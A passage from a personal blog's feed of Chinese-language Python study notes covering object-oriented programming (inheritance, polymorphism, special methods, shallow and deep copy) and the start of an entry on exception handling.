class="hljs-params">(stu1.native_pace)</span></span>#天津<br></code></pre></td></tr></tbody></table></figure><p>2.类方法：使用<code>@classmethod</code>修饰，用类名直接访问</p><pre><code class="hljs">Student.cm()</code></pre><p>3.静态方法：使用<code>@staticmethod</code>修饰，用类名直接访问</p><pre><code class="hljs">Student.method()</code></pre><p>4.动态绑定属性和方法</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,name,age</span>):<br>        <span class="hljs-variable language_">self</span>.name=name<br>        <span class="hljs-variable language_">self</span>.age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">eat</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>        print(<span class="hljs-variable language_">self</span>.name+<span class="hljs-string">'在吃饭'</span>)<br>stu1=Student(<span class="hljs-string">'张三'</span>,<span class="hljs-number">20</span>)<br>stu2=Student(<span class="hljs-string">'李四'</span>,<span class="hljs-number">30</span>)<br>stu1.gender=<span class="hljs-string">'女'</span><span class="hljs-comment">#动态绑定属性</span><br>print(stu1.name,stu1.age,stu1.gender)<span class="hljs-comment">#张三 20 女</span><br>print(stu2.name,stu2.age)<span class="hljs-comment">#李四 30</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>()<span class="hljs-symbol">:</span><span class="hljs-comment">#动态绑定方法</span><br>    print(<span class="hljs-string">'定义在类之外，称为函数'</span>)<br>stu1.show=show<br>stu1.show()<span class="hljs-comment">#定义在类之外，称为函数</span><br></code></pre></td></tr></tbody></table></figure><h1 id="面向对象三大特征"><a href="#面向对象三大特征" class="headerlink" title="面向对象三大特征"></a>面向对象三大特征</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>提高程序安全性，将数据（属性）和行为（方法）包装到类对象中，在方法内部对属性进行操作，在类对象的为外部调用方法。</p><p>在python表属性私有，不希望属性在类对象外部被调用，前面加两个下划线。</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,brand</span>):<br>        <span class="hljs-variable language_">self</span>.brand=brand<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>        print(<span class="hljs-string">'汽车已启动'</span>)<br>car=Car(<span class="hljs-string">'宝马X5'</span>)<br>car.start()<span class="hljs-comment">#汽车已启动</span><br>print(car.brand)<span class="hljs-comment">#宝马X5</span><br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.__age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.name,self.__age)<br>stu=Student(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br>stu.show()<span class="hljs-comment">#Jack 20</span><br><span class="hljs-built_in">print</span>(stu.name)<span class="hljs-comment">#Jack</span><br> <span class="hljs-comment">#print(stu.__age)#类外不可调用私有</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(stu))<br><span class="hljs-built_in">print</span>(stu._Student__age)<span class="hljs-comment">#在类外可以使用_Student__age访问私有</span><br></code></pre></td></tr></tbody></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>提高的代码复用性</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">class</span> <span class="hljs-constructor">Person(<span class="hljs-params">object</span>)</span>:<br>    def <span class="hljs-constructor">__init__(<span class="hljs-params">self</span>,<span class="hljs-params">name</span>,<span class="hljs-params">age</span>)</span>:<br>        self.name=name<br>        self.age=age<br>    def info(self):<br>        print(self.name,self.age)<br><span class="hljs-keyword">class</span> <span class="hljs-constructor">Student(Person)</span>:<br>    def <span class="hljs-constructor">__init__(<span class="hljs-params">self</span>,<span class="hljs-params">name</span>,<span class="hljs-params">age</span>,<span class="hljs-params">num</span>)</span>:<br>        super<span class="hljs-literal">()</span>.<span class="hljs-constructor">__init__(<span class="hljs-params">name</span>,<span class="hljs-params">age</span>)</span><br>        self.num=num<br><span class="hljs-keyword">class</span> <span class="hljs-constructor">Teacher(Person)</span>:<br>    def <span class="hljs-constructor">__init__(<span class="hljs-params">self</span>,<span class="hljs-params">name</span>,<span class="hljs-params">age</span>,<span class="hljs-params">tyear</span>)</span>:<br>        super<span class="hljs-literal">()</span>.<span class="hljs-constructor">__init__(<span class="hljs-params">name</span>,<span class="hljs-params">age</span>)</span><br>        self.tyear=tyear<br>stu=<span class="hljs-constructor">Student('Jack',20,'1001')</span><br>teacher=<span class="hljs-constructor">Teacher('Rose',30,10)</span><br>stu.info<span class="hljs-literal">()</span>#Jack <span class="hljs-number">20</span><br>teacher.info<span class="hljs-literal">()</span>#Rose <span class="hljs-number">30</span><br></code></pre></td></tr></tbody></table></figure><h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><figure class="highlight angelscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">A</span>(<span class="hljs-symbol">object</span>):<br>    <span class="hljs-symbol">pass</span><br><span class="hljs-symbol">class</span> <span class="hljs-symbol">B</span>(<span class="hljs-symbol">object</span>):<br>    <span class="hljs-symbol">pass</span><br><span class="hljs-symbol">class</span> <span class="hljs-symbol">C</span>(<span class="hljs-symbol">A,<span class="hljs-symbol">B</span></span>):<br>    <span class="hljs-symbol">pass</span><br></code></pre></td></tr></tbody></table></figure><h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p>若子类对父类某个属性或方法不满意，可在子类中对其进行重写</p><p>子类重写后的方法可用<code>super().xxx</code>调用父类2中被重写的方法</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.name,self.age)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age,num</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name,age)<br>        self.num=num<br>    <span class="hljs-comment">#方法重写</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().info()<br>        <span class="hljs-built_in">print</span>(self.num)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age,tyear</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name,age)<br>        self.tyear=tyear<br>    <span class="hljs-comment">#方法重写</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().info()<br>        <span class="hljs-built_in">print</span>(self.tyear)<br>stu=Student(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>,<span class="hljs-string">'1001'</span>)<br>teacher=Teacher(<span class="hljs-string">'Rose'</span>,<span class="hljs-number">30</span>,<span class="hljs-number">10</span>)<br>stu.info()<span class="hljs-comment">#Jack 20 1001</span><br>teacher.info()<span class="hljs-comment">#Rose 30  10</span><br></code></pre></td></tr></tbody></table></figure><h3 id="object类"><a href="#object类" class="headerlink" title="object类"></a>object类</h3><ul><li>是所有类的父类</li><li>内置函数dir()可查看指定对象所有属性</li><li><code>__str__()</code>方法：返回一个对于对象的描述，对应于内置函数str()经常用于print()方法，查看对象信息</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">'我名字是{0},今年{1}岁'</span>.<span class="hljs-built_in">format</span>(self.name,self.age)<br>stu=Student(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(stu))<br><span class="hljs-built_in">print</span>(stu)<span class="hljs-comment">#我名字是Jack,今年20岁</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(stu))<span class="hljs-comment">#&lt;class '__main__.Student'&gt;</span><br></code></pre></td></tr></tbody></table></figure><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>1.不知变量引用类型，仍可以用此变量调用方法，在运行过程中根据变量所用对象类型，动态决定调用哪个对象中的方法。</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-type">def</span> <span class="hljs-title">eat</span>(self):<br>        print(<span class="hljs-string">'动物吃东西'</span>)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>(Animal):<br>    def eat(self):<br>        print(<span class="hljs-string">'狗吃骨头'</span>)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>(Animal):<br>    def eat(self):<br>        print(<span class="hljs-string">'猫吃鱼'</span>)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-type">def</span> <span class="hljs-title">eat</span>(self):<br>        print(<span class="hljs-string">'人吃饭'</span>)<br>def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(obj)</span></span>:<br>    obj.eat()<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Cat()</span></span>)#猫吃鱼<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Dog()</span></span>)#狗吃骨头<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Animal()</span></span>)#动物吃东西<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(Person()</span></span>)#人吃饭<br></code></pre></td></tr></tbody></table></figure><p>2.静态语言与动态语言</p><p>（1）静态语言实现多态的三个必要条件：继承、方法重写、父类引用。指向子类对象。</p><p>（2）动态语言的多态崇尚“鸭子类型”，当看到一只鸟走起来像鸭子，游泳似鸭，收起来也似鸭，那么这只鸟可被称为鸭子。在鸭子类型中，无需关心对象是什么类型，到底是不是鸭子，只关心对象的行为。</p><h2 id="特殊方法和特殊属性"><a href="#特殊方法和特殊属性" class="headerlink" title="特殊方法和特殊属性"></a>特殊方法和特殊属性</h2><h3 id="特殊属性"><a href="#特殊属性" class="headerlink" title="特殊属性"></a>特殊属性</h3><p><code>__dict__</code>获得类对象或者实例对象所绑定的所有属性和方法的字典</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span>(dir(object))<br>class A:<br>    pass<br>class B:<br>    pass<br>class C(A,B):<br>    def __init__(self,name,age):<br>        self.<span class="hljs-attribute">name</span>=name<br>        self.<span class="hljs-attribute">age</span>=age<br><span class="hljs-attribute">x</span>=C('Jack',20)# x为C类的一个实例对象<br><span class="hljs-built_in">print</span>(x.__dict__)#实例对象的属性字典 {<span class="hljs-string">'name'</span>: <span class="hljs-string">'Jack'</span>, <span class="hljs-string">'age'</span>: 20}<br><span class="hljs-built_in">print</span>(C.__dict__)#{<span class="hljs-string">'__module__'</span>: <span class="hljs-string">'__main__'</span>, <span class="hljs-string">'__init__'</span>: &lt;function C.__init__ at 0x000002B51547DC10&gt;, <span class="hljs-string">'__doc__'</span>: None}<br><span class="hljs-built_in">print</span>(x.__class__)#输出了对象所属的类 &lt;class <span class="hljs-string">'__main__.C'</span>&gt;<br><span class="hljs-built_in">print</span>(C.__bases__)#C类的父类类型元素 (&lt;class <span class="hljs-string">'__main__.A'</span>&gt;, &lt;class <span class="hljs-string">'__main__.B'</span>&gt;)<br><span class="hljs-built_in">print</span>(C.__base__)#类的基类 &lt;class <span class="hljs-string">'__main__.A'</span>&gt;<br><span class="hljs-built_in">print</span>(C.__mro__)#类的层次结构 (&lt;class <span class="hljs-string">'__main__.C'</span>&gt;, &lt;class <span class="hljs-string">'__main__.A'</span>&gt;, &lt;class <span class="hljs-string">'__main__.B'</span>&gt;, &lt;class <span class="hljs-string">'object'</span>&gt;)<br><span class="hljs-built_in">print</span>(A.__subclasses__())#子类的列表 [&lt;class <span class="hljs-string">'__main__.C'</span>&gt;]<br></code></pre></td></tr></tbody></table></figure><h3 id="特殊方法"><a href="#特殊方法" class="headerlink" title="特殊方法"></a>特殊方法</h3><ul><li><code>__len__()</code> 通过重写此方法，让len()的参数可以自定义类型</li><li><code>__add__()</code> 通过重写此方法，令自定义对象具有相加的功能</li><li><code>__new__()</code> 创建对象</li><li><code>__init__()</code> 对创建的对象初始化</li></ul><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,name</span>):<br>        <span class="hljs-variable language_">self</span>.name=name<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,other</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.name+other.name<br>stu1=Student(<span class="hljs-string">'Jack'</span>)<br>stu2=Student(<span class="hljs-string">'Rose'</span>)<br>s=stu1+stu2<br>print(s)<span class="hljs-comment">#JackRose</span><br>print(stu1.__add__(stu2))<span class="hljs-comment">#JackRose</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__led__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(self.name)<br>···<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<span class="hljs-comment">#8</span><br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls,*args,**kwargs</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'__new__被调用执行了，cls的id值为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(cls)))<br>        obj=<span class="hljs-built_in">super</span>().__new__(cls)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'创建对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(obj)))<br>        <span class="hljs-keyword">return</span> obj<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.age=age<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'object类对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(<span class="hljs-built_in">object</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'Person类对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(Person)))<br> <span class="hljs-comment">#创建Person类的实例对象</span><br>p1=Person(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'p1这个Person类的实例对象id为{0}'</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">id</span>(p1)))<br> <span class="hljs-comment">#object类对象id为140723223092736</span><br> <span class="hljs-comment">#Person类对象id为2976723261008</span><br> <span class="hljs-comment">#__new__被调用执行了，cls的id值为2976723261008</span><br> <span class="hljs-comment">#创建对象id为2976753841488</span><br> <span class="hljs-comment">#p1这个Person类的实例对象id为2976753841488</span><br></code></pre></td></tr></tbody></table></figure><p>解读：</p><ol><li>执行<code>p1=Person()</code>，将值传入class Person中的cls</li><li><strong>new</strong>()创建对西昂obj,传值cls</li><li>obj返回，传入初始化__init__()</li><li>初始化后返回p1</li></ol><h2 id="类的浅拷贝与深拷贝"><a href="#类的浅拷贝与深拷贝" class="headerlink" title="类的浅拷贝与深拷贝"></a>类的浅拷贝与深拷贝</h2><ol><li>变量的赋值操作</li><li>浅拷贝：对象包含的子对象内容不拷贝，因此，源对象与拷贝对象会引用同一个对象</li><li>深拷贝：使用copy模块中的deepcopy函数，递归拷贝对象中包含的子对象，源对象和拷贝对象所有的子对象也不相同。</li></ol><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">class Cpu:<br>    pass<br>class Disk:<br>    pass<br>class Computer:<br>    def __init__(self,cpu,disk):<br>        self.<span class="hljs-attribute">cpu</span>=cpu<br>        self.<span class="hljs-attribute">disk</span>=disk<br> #变量的赋值<br><span class="hljs-attribute">cpu1</span>=Cpu()<br><span class="hljs-attribute">cpu2</span>=cpu1<br><span class="hljs-built_in">print</span>(cpu1,cpu2)<br> #类的浅拷贝<br><span class="hljs-attribute">disk</span>=Disk()<br><span class="hljs-attribute">computer</span>=Computer(cpu1,disk)<br>import copy<br><span class="hljs-attribute">computer2</span>=copy.copy(computer)<br><span class="hljs-built_in">print</span>(computer,computer.cpu,computer.disk)#&lt;__main__.Computer object at 0x000002B5136EFB20&gt;，&lt;__main__.Cpu object at 0x000002B51463B490&gt;，&lt;__main__.Disk object at 0x000002B51463B910&gt;<br><span class="hljs-built_in">print</span>(computer2,computer2.cpu,computer2.disk)#&lt;__main__.Computer object at 0x000002B5148602E0&gt;，&lt;__main__.Cpu object at 0x000002B514860460&gt;，&lt;__main__.Disk object at 0x000002B5148601C0&gt;<br> #只拷贝computer,不拷贝子对象(disk,cpu)<br> #深拷贝<br><span class="hljs-attribute">computer3</span>=copy.deepcopy(computer)<br><span class="hljs-built_in">print</span>(computer3,computer3.cpu,computer3.disk)#&lt;__main__.Computer object at 0x000002B51541C730&gt; &lt;__main__.Cpu object at 0x000002B51541CBE0&gt; &lt;__main__.Disk object at 0x000002B51541C160&gt;<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;面向对象篇啦！！！！&lt;/p&gt;
&lt;h1 id=&quot;类与对象&quot;&gt;&lt;a href=&quot;#类与对象&quot; class=&quot;headerlink&quot; title=&quot;类与对象&quot;&gt;&lt;/a&gt;类与对象&lt;/h1&gt;&lt;p&gt;类：多个类似事物组成的群体；数据类型&lt;/p&gt;
&lt;p&gt;对象：100，99是int类下包含的</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习7</title>
    <link href="https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A07/"/>
    <id>https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A07/</id>
    <published>2022-09-19T11:28:00.378Z</published>
    <updated>2022-09-19T15:05:38.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p>1.常见类型</p><p>(1)语法错误：SyntaxError</p><p>(2)索引越界问题：IndexError</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">lst=<span class="hljs-selector-attr">[1,2,3,4]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lst[<span class="hljs-number">4</span>])</span></span><br>l=<span class="hljs-selector-attr">[]</span><br>l=<span class="hljs-built_in">append</span>(<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(l)</span></span><br> #修改：l<span class="hljs-selector-class">.append</span>(<span class="hljs-string">'a'</span>)<br></code></pre></td></tr></tbody></table></figure><p>(3)思路不清导致的问题解决方案</p><ul><li>使用print()</li><li>用<code> #</code>暂时注释代码<br>(4)被动：用户输入错误导致返回错误</li></ul><h1 id="Python异常处理机制"><a href="#Python异常处理机制" class="headerlink" title="Python异常处理机制"></a>Python异常处理机制</h1><p>Python提供了异常处理机制，可以在异常出现时即时捕获。内部消化，令程序继续运行。</p><h2 id="try-…-except-异常类型-……"><a href="#try-…-except-异常类型-……" class="headerlink" title="try:…     except 异常类型:……"></a><code>try:…     except 异常类型:……</code></h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    a=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    b=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    c=a/b<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br><span class="hljs-keyword">except</span> ZeroDivisionError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'Sorry,Not is 0'</span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="多个except结构：try…except…excep…except-BaseException-…"><a href="#多个except结构：try…except…excep…except-BaseException-…" class="headerlink" title="多个except结构：try…except…excep…except BaseException:…"></a>多个except结构：<code>try…except…excep…except BaseException:…</code></h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    a=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    b=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'Input a num:'</span>))<br>    c=a/b<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br><span class="hljs-keyword">except</span> ZeroDivisionError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'Sorry,Not is 0'</span>)<br><span class="hljs-keyword">except</span> ValueError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'input number'</span>)<br><span class="hljs-keyword">except</span> BaseException <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></tbody></table></figure><h2 id="try…except…finally"><a href="#try…except…finally" class="headerlink" title="try…except…finally"></a><code>try…except…finally</code></h2><p>finally无论是否异常都执行，常用于释放try中申请的资源。</p><h2 id="常见异常类型"><a href="#常见异常类型" class="headerlink" title="常见异常类型"></a>常见异常类型</h2><ul><li>ZeroDivisionError ——除零（所有数据类型）</li><li>IndexError ——序列中没有此索引（index）</li><li>KeyError ——映射中没有此链</li><li>NameError ——未声明初始化对象</li><li>SyntaxError ——Python语法错误</li><li>ValueError ——传入无效的参数</li></ul><h2 id="traceback模块"><a href="#traceback模块" class="headerlink" title="traceback模块"></a>traceback模块</h2><p>打印异常信息</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">traceback</span><br><span class="hljs-variable"><span class="hljs-keyword">try</span></span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-number">1</span>/<span class="hljs-number">0</span>)</span><br><span class="hljs-variable"><span class="hljs-keyword">except</span></span>:<br>    <span 